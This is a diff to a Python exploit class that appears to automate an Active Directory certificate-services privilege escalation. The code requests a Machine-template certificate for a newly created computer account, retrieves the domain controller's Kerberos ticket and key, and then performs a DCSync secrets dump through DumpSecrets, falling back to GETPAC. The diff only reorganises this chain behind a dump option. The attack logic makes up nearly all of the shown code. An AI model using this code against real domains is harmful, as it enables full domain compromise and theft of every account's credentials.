@@ -167,52 +167,55 @@ class Exploit:
                 ca_service = enrollment_service.get("cn")[0].decode()
                 ca_host = enrollment_service.get("dNSHostName")[0].decode()
             
-            #print(ca_service,":",ca_host)
-
-            # find template Machine
-            if b'Machine' in enrollment_service.get("certificateTemplates"):
-                logging.info(f"Certificate Machine found!")
-
-            # print(f"certipy req 'lunar.eruca.com/{new_computer_name}:{new_computer_password}@{dcfull}' -dc-ip {self.options.dc_ip} -ca {ca_service[0].decode('utf-8')} -template {self.options.template}")
+            logging.info(f"Service: {ca_service}, dnsHostName {ca_host}")
             
-            # request certificate template for the newly created machine from the service
-            # require service lunar-LUNDC-CA
-            # require template machine
-            # require username
-
-            cert_pass = ''.join(random.choice(list(string.ascii_letters + string.digits + "!@#$%^&*()")) for _ in range(12))
-            
-            try:
-                pfx_bytes = main_req(self.options,ca_host,ca_service,new_computer_name,new_computer_password,domain,lmhash,nthash,cert_pass)
-                enc_key, ccache_bytes = amain(self.options,cert_pass,pfx_bytes,domain,f'{dc_host}$')
-                #enc_key = amain(self.options,cert_pass,f'{new_computer_name}.pfx',domain,f'{dc_host}$')
-                logging.info(f'Encryption key retrieved: {enc_key}')
-            except:
-                return
-           
-            ccache_loc = f'{dc_host}$.ccache'
-            os.environ['KRB5CCNAME'] = ccache_loc
-
-            # dcsync
-            if self.options.dump:
-                try:
-                    self.options.k = True
-                    self.options.target_ip = self.options.dc_ip
-                    self.options.system = self.options.bootkey = self.options.security = self.options.system = self.options.ntds = self.options.sam = self.options.resumefile = self.options.outputfile = None
-                    dumper = DumpSecrets(dcfull, '', '',domain, self.options)
-                    dumper.dump()
-                except Exception as e:
-                    if logging.getLogger().level == logging.DEBUG:
-                        import traceback
-                        traceback.print_exc()
-                    logging.error(str(e))
+            if not self.options.dump:
+                logging.info("Machine created and attributes updated")
             else:
-                self.options.key = enc_key
-                dumper = GETPAC(dc_host,domain,self.options)
-                dumper.dump()
+                # find template Machine
+                if b'Machine' in enrollment_service.get("certificateTemplates"):
+                    logging.info(f"Certificate Machine found!")
 
-            logging.info("Cleaning up...")
-            clean_up()
+                # print(f"certipy req 'lunar.eruca.com/{new_computer_name}:{new_computer_password}@{dcfull}' -dc-ip {self.options.dc_ip} -ca {ca_service[0].decode('utf-8')} -template {self.options.template}")
+                
+                # request certificate template for the newly created machine from the service
+                # require service lunar-LUNDC-CA
+                # require template machine
+                # require username
+
+                cert_pass = ''.join(random.choice(list(string.ascii_letters + string.digits + "!@#$%^&*()")) for _ in range(12))
+                
+                try:
+                    pfx_bytes = main_req(self.options,ca_host,ca_service,new_computer_name,new_computer_password,domain,lmhash,nthash,cert_pass)
+                    enc_key, ccache_bytes = amain(self.options,cert_pass,pfx_bytes,domain,f'{dc_host}$')
+                    #enc_key = amain(self.options,cert_pass,f'{new_computer_name}.pfx',domain,f'{dc_host}$')
+                    logging.info(f'Encryption key retrieved: {enc_key}')
+                except:
+                    return
+               
+                ccache_loc = f'{dc_host}$.ccache'
+                os.environ['KRB5CCNAME'] = ccache_loc
+
+                # dcsync
+                try:
+                    try:
+                        self.options.k = True
+                        self.options.target_ip = self.options.dc_ip
+                        self.options.system = self.options.bootkey = self.options.security = self.options.system = self.options.ntds = self.options.sam = self.options.resumefile = self.options.outputfile = None
+                        dumper = DumpSecrets(dcfull, '', '',domain, self.options)
+                        dumper.dump()
+                    except Exception as e:
+                        if logging.getLogger().level == logging.DEBUG:
+                            import traceback
+                            traceback.print_exc()
+                        logging.error(str(e))
+                except:
+                    self.options.key = enc_key
+                    dumper = GETPAC(dc_host,domain,self.options)
+                    dumper.dump()
+
+                logging.info("Cleaning up...")
+                clean_up()
 
     def find_enrollment_services(self,ldap_session,dn):
         enroll_filter = "(objectCategory=pKIEnrollmentService)"
